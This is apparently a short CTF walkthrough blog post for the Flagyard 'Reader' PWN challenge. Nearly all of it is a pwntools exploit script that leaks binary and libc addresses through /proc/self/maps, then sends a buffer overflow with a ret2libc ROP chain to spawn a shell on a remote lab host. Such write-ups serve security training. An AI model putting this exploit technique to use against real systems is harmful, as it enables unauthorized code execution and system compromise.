---
title: "Flagyard - Reader"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
  - CTF
tags:
  - Hacking
  - Walkthrough
  - CTF
  - Flagyard
header:
  overlay_image: /assets/images/pasek-hack.png
---
# Flagyard - Reader
{: .text-justify}

## 00. Metainfo

|:----|:----|
|Portal:|[Flagyard](https://flagyard.com/)|
|Task:|[Reader](https://flagyard.com/labs/training-labs/5/challenges/ec874161-e57b-4403-8ace-de20790c4b1f)|
|Category:|PWN|

# 01. Description
Next challenge from Flagyard. I also spent some time on it, but I went in a different direction than before. Anyway, you’ll see for yourselves. Below is the source code showing how to get through it.
{: .text-justify}
## Solve in Python

```py
from pwn import *             
import re

context.update(arch='x86_64', os='linux') 
context.terminal = ['wt.exe','wsl.exe'] 

binary = context.binary = ELF("./reader", checksec=False)

if args.REMOTE:
    p = remote('nc 34.252.33.37 30476'.split()[1], 30476)
else:
    p = process(binary.path)    

program_name='/app/run'

p.sendlineafter(b"read:", b'/proc/self/maps')
SELF_MAPS=p.recvuntil(b'give me file to read: ')
base_pattern=re.search(r'^\s*([0-9a-f]+).*'+program_name,SELF_MAPS.decode(),re.MULTILINE)
libc_pattern=re.search(r'^\s*([0-9a-f]+).*/libc.so.6',SELF_MAPS.decode(),re.MULTILINE)

base_address=int("0x"+base_pattern.group(1),16)
libc_address=int("0x"+libc_pattern.group(1),16)
ret=base_address+0x101a

pop_rdi=libc_address+0x000000000010f75b
system=libc_address+0x58740
str_bin_sh=libc_address+0x1cb42f

length=120
payload=b"A"*length+p64(ret)+p64(pop_rdi)+p64(str_bin_sh)+p64(system)
p.sendline(payload)

p.interactive()
```
## Summary
This is tricky challenge. I like it.
{: .text-justify}


